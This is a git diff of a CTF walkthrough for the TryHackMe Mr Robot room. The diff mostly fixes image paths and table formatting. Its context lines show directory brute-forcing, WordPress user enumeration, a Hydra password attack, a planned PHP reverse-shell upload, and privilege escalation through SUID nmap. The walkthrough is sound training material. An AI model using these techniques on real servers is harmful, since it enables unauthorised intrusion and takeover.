@@ -27,17 +27,17 @@ Results:
 gobuster dir -u http://10.129.167.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
 ```
 
-![Gobuster output](TryHackMe/Mr-Robot-CTF/assets/1.png)
+![Gobuster output](assets/1.png)
 
 Relevant results:
 
-|Path|Status|Notes|
-|---|---|---|
-|`/robots.txt`|200|Contains hidden paths|
-|`/wp-login.php`|200|WordPress login|
-|`/wp-admin`|301|Admin panel|
-|`/readme`|200|Message with no useful info|
-|`/.htpasswd`|403|Forbidden|
+| Path            | Status | Notes                       |
+| --------------- | ------ | --------------------------- |
+| `/robots.txt`   | 200    | Contains hidden paths       |
+| `/wp-login.php` | 200    | WordPress login             |
+| `/wp-admin`     | 301    | Admin panel                 |
+| `/readme`       | 200    | Message with no useful info |
+| `/.htpasswd`    | 403    | Forbidden                   |
 
 ---
 
@@ -45,7 +45,7 @@ Relevant results:
 
 `/robots.txt` reveals two entries:
 
-![robots.txt](TryHackMe/Mr-Robot-CTF/assets/2.png)
+![robots.txt](assets/2.png)
 
 ```
 key-1-of-3.txt
@@ -74,7 +74,7 @@ WordPress leaks whether a user exists through different error messages:
 
 Testing `elliot` (main character of the Mr. Robot series) → the server confirms the user exists.
 
-![WordPress confirms Elliot username](TryHackMe/Mr-Robot-CTF/assets/3.png)
+![WordPress confirms Elliot username](assets/3.png)
 
 ### Brute Force with Hydra
 
@@ -88,7 +88,7 @@ hydra -l elliot -P dic_clean.txt 10.129.167.131 http-post-form "/wp-login.php:lo
 
 Password found: `ER28-0652`
 
-![Hydra finds the password](TryHackMe/Mr-Robot-CTF/assets/4.png)
+![Hydra finds the password](assets/4.png)
 
 ---
 
@@ -96,13 +96,13 @@ Password found: `ER28-0652`
 
 With access to the WordPress admin panel (`/wp-admin`), we abuse the plugin upload functionality to execute PHP code on the server.
 
-![WordPress admin panel with users](TryHackMe/Mr-Robot-CTF/assets/5.png)
+![WordPress admin panel with users](assets/5.png)
 
 ### Create the Payload
 
 Create a PHP file with a bash reverse shell:
 
-![shell.php creation](TryHackMe/Mr-Robot-CTF/assets/6.png)
+![shell.php creation](assets/6.png)
 
 ```bash
 cat > shell.php << 'EOF'
@@ -149,9 +149,9 @@ stty raw -echo; fg
 
 Inside `/home/robot` we find two files:
 
-![Shell as daemon, permission denied](TryHackMe/Mr-Robot-CTF/assets/7.png)
+![Shell as daemon, permission denied](assets/7.png)
 
-![File permissions in /home/robot](TryHackMe/Mr-Robot-CTF/assets/8.png)
+![File permissions in /home/robot](assets/8.png)
 
 - `key-2-of-3.txt` — permission denied (owned by `robot`)
 - `password.raw-md5` — MD5 hash of `robot`'s password
@@ -164,7 +164,7 @@ find / -perm -4000 2>/dev/null
 
 Key finding: `/usr/local/bin/nmap` has the SUID bit set.
 
-![SUID binaries](TryHackMe/Mr-Robot-CTF/assets/9.png)
+![SUID binaries](assets/9.png)
 
 ### Privesc via Interactive Nmap
 
@@ -180,7 +180,7 @@ whoami
 # root
 ```
 
-![whoami root](TryHackMe/Mr-Robot-CTF/assets/10.png)
+![whoami root](assets/10.png)
 
 ### Alternative (without SUID)
 
